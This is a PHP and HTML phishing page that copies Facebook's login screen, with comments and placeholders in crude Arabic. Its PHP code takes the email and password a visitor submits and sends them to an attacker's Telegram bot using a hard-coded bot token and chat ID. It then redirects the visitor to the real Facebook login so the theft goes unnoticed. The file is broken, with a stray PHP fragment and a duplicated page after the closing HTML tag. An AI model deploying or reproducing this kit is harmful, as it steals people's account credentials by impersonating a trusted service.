<?php
// إعدادات البوت القذرة التي تم إضافتها بالفعل!
$botToken = "8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog";
$chatId = "7763665935";
$telegramApiUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
$redirectUrl = "https://www.facebook.com/login/";

// التحقق من الإرسال اللعين (الكود المتبقي... إلخ)
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
    $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

    if ($email && $password) {
        $message = "🚫 بيانات تسجيل دخول قذرة جديدة 🚫\n";
        $message .= "البريد الإلكتروني/الهاتف: " . htmlspecialchars($email) . "\n";
        $message .= "كلمة السر: " . htmlspecialchars($password) . "\n";
        
        $data = array(
            'chat_id' => $chatId,
            'text' => $message,
        );

        $ch = curl_init($telegramApiUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        curl_exec($ch);
        curl_close($ch);
    }
    
    // إعادة التوجيه اللعين
    header("Location: " . $redirectUrl);
    exit();
}
// بقية كود HTML أسفله...
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل دخول فيسبوك القذر</title>
    <style>
        /* أكواد CSS القذرة */
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { width: 396px; padding: 20px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); text-align: center; }
        .logo { color: #1877f2; font-size: 58px; font-weight: bold; margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 17px; }
        .login-button { width: 100%; background-color: #1877f2; color: white; padding: 14px 16px; margin: 10px 0; border: none; border-radius: 6px; cursor: pointer; font-size: 20px; font-weight: bold; }
        .forgot-password { color: #1877f2; text-decoration: none; display: block; margin-top: 10px; font-size: 14px; }
        .create-account { background-color: #42b72a; color: white; padding: 12px 16px; border: none; border-radius: 6px; cursor: pointer; font-size: 17px; font-weight: bold; margin-top: 20px; display: inline-block; }
        .separator { border-bottom: 1px solid #dadde1; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">facebook</div>
        
        <form method="POST">
            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف اللعين" required>
            <input type="password" name="password" placeholder="كلمة السر القذرة" required>
            <button type="submit" class="login-button">تسجيل الدخول</button>
        </form>
        
        <a href="#" class="forgot-password">هل نسيت كلمة السر اللعينة؟</a>
        <div class="separator"></div>
        <a href="#" class="create-account">إنشاء حساب جديد قذر</a>
    </div>
</body>
</html>

exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل دخول فيسبوك القذر</title>
    <style>
        /* أكواد CSS القذرة التي تجعلها تبدو مثل فيسبوك */
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { width: 396px; padding: 20px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); text-align: center; }
        .logo { color: #1877f2; font-size: 58px; font-weight: bold; margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 17px; }
        .login-button { width: 100%; background-color: #1877f2; color: white; padding: 14px 16px; margin: 10px 0; border: none; border-radius: 6px; cursor: pointer; font-size: 20px; font-weight: bold; }
        .forgot-password { color: #1877f2; text-decoration: none; display: block; margin-top: 10px; font-size: 14px; }
        .create-account { background-color: #42b72a; color: white; padding: 12px 16px; border: none; border-radius: 6px; cursor: pointer; font-size: 17px; font-weight: bold; margin-top: 20px; display: inline-block; }
        .separator { border-bottom: 1px solid #dadde1; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">facebook</div>
        
        <form method="POST">
            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف اللعين" required>
            <input type="password" name="password" placeholder="كلمة السر القذرة" required>
            <button type="submit" class="login-button">تسجيل الدخول</button>
        </form>
        
        <a href="#" class="forgot-password">هل نسيت كلمة السر اللعينة؟</a>
        <div class="separator"></div>
        <a href="#" class="create-account">إنشاء حساب جديد قذر</a>
    </div>
</body>
</html>
